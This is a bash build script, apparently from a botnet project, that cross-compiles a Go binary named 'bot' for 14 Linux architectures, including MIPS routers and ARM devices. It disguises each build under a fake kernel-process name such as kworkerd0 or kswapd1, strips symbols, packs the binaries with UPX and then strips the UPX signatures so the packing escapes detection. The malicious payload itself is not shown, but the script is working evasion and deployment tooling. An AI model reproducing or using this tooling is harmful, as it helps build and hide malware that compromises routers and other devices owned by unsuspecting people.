#!/bin/bash

# Sins Custom legiatmate Name Builder 
# yes we are using UPX (GO is large) if you want to remove the strings from the binaries you can use my tool here
#  https://github.com/Syn2Much/upx-stripper

# Array of binary names to use for obfuscation (disguised as kernel/system processes)
AMBS=("kworkerd0" "ethd0" "mdsync1" "ksnapd0" "kswapd1"
      "ip6addrd" "deferwqd" "devfreqd0" "kintegrity0" "biosd0" "kpsmoused0"
      "ttmswapd" "vredisd0" "kvmirqd")

# Create bins folder if it doesn't exist
BINS_DIR="./bins"
mkdir -p "$BINS_DIR"

# Counter for AMBS array
INDEX=0

# Function to build for a specific architecture
build_for_arch() {
    local arch_name="$1"   # Human-readable architecture name
    local goos="$2"        # GOOS value (operating system)
    local goarch="$3"      # GOARCH value (architecture)
    local goarm="$4"       # GOARM value (only for ARM)
    
    echo -e "\nBuilding for $arch_name..."
    
    if [ -n "$goarm" ]; then
        # ARM architectures require GOARM setting
        GOOS="$goos" GOARCH="$goarch" GOARM="$goarm" go build -trimpath -ldflags="-s -w -buildid=" -o bot *.go
    else
        GOOS="$goos" GOARCH="$goarch" go build -trimpath -ldflags="-s -w -buildid=" -o bot *.go
    fi
    
    # Check if build succeeded
    if [ ! -f "bot" ]; then
        echo "ERROR: Build failed for $arch_name"
        return 1
    fi
    
    # Strip symbols (safe size reduction)
    if command -v strip &> /dev/null; then
        strip --strip-all bot 2>/dev/null || echo "strip failed for $arch_name"
    fi

    # Rename the built binary to the obfuscated name from AMBS array
    mv bot "${AMBS[$INDEX]}"

    # Compress the binary with UPX (fast aggressive compression)
    # Using --best --lzma for good compression without ultra-brute slowness
    if command -v upx &> /dev/null; then
        upx --best --lzma "${AMBS[$INDEX]}" 2>/dev/null || \
        upx -9 "${AMBS[$INDEX]}" 2>/dev/null || \
        echo "UPX compression skipped for $arch_name"
    fi
    # Move to bins directory
    mv "${AMBS[$INDEX]}" "$BINS_DIR/"
    INDEX=$((INDEX + 1))
}

# ======================== BINARY ARCHITECTURE MAPPING ========================
# Build for all architectures - each gets a different binary name from AMBS array
# 
# BINARY NAME    | ARCHITECTURE    | GOOS  | GOARCH | GOARM | COMMENTS
# ---------------|-----------------|-------|--------|-------|-------------------
# kworkerd0      | x86 (386)       | linux | 386    |       | 32-bit Intel/AMD
# ethd0          | x86_64          | linux | amd64  |       | 64-bit Intel/AMD
# mdsync1        | ARMv7           | linux | arm    | 7     | ARM 32-bit v7 (Raspberry Pi 2/3)
# ksnapd0        | ARMv5           | linux | arm    | 5     | ARM 32-bit v5 (older ARM)
# kswapd1        | ARMv6           | linux | arm    | 6     | ARM 32-bit v6 (Raspberry Pi 1)
# ip6addrd       | ARM64           | linux | arm64  |       | ARM 64-bit (Raspberry Pi 4, Android)
# deferwqd       | MIPS            | linux | mips   |       | MIPS big-endian (routers)
# devfreqd0      | MIPSLE          | linux | mipsle |       | MIPS little-endian
# kintegrity0    | MIPS64          | linux | mips64 |       | MIPS 64-bit big-endian
# biosd0         | MIPS64LE        | linux | mips64le |     | MIPS 64-bit little-endian
# kpsmoused0     | PPC64           | linux | ppc64  |       | PowerPC 64-bit big-endian
# ttmswapd       | PPC64LE         | linux | ppc64le |      | PowerPC 64-bit little-endian
# vredisd0       | s390x           | linux | s390x  |       | IBM System/390 64-bit
# kvmirqd        | RISC-V 64       | linux | riscv64|       | RISC-V 64-bit

# Build for all architectures
build_for_arch "x86 (386)" "linux" "386"         # kworkerd0
build_for_arch "x86_64" "linux" "amd64"          # ethd0
build_for_arch "ARMv7" "linux" "arm" "7"         # mdsync1
build_for_arch "ARMv5" "linux" "arm" "5"         # ksnapd0
build_for_arch "ARMv6" "linux" "arm" "6"         # kswapd1
build_for_arch "ARM64" "linux" "arm64"           # ip6addrd
build_for_arch "MIPS" "linux" "mips"             # deferwqd
build_for_arch "MIPSLE" "linux" "mipsle"         # devfreqd0
build_for_arch "MIPS64" "linux" "mips64"         # kintegrity0
build_for_arch "MIPS64LE" "linux" "mips64le"     # biosd0
build_for_arch "PPC64" "linux" "ppc64"           # kpsmoused0
build_for_arch "PPC64LE" "linux" "ppc64le"       # ttmswapd
build_for_arch "s390x" "linux" "s390x"           # vredisd0
build_for_arch "RISC-V 64" "linux" "riscv64"     # kvmirqd

echo -e "\nAll 14 builds complete!"
echo "Built binaries saved to $BINS_DIR/:"
ls -la "$BINS_DIR/"

# Strip UPX signatures from packed binaries using deUPX.py
echo -e "\nStripping UPX signatures from binaries..."
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [ -f "$SCRIPT_DIR/deUPX.py" ]; then
    python3 "$SCRIPT_DIR/deUPX.py" "$BINS_DIR/"
    echo -e "\nUPX signatures stripped successfully!"
else
    echo "WARNING: deUPX.py not found at $SCRIPT_DIR/deUPX.py - skipping UPX stripping"
fi
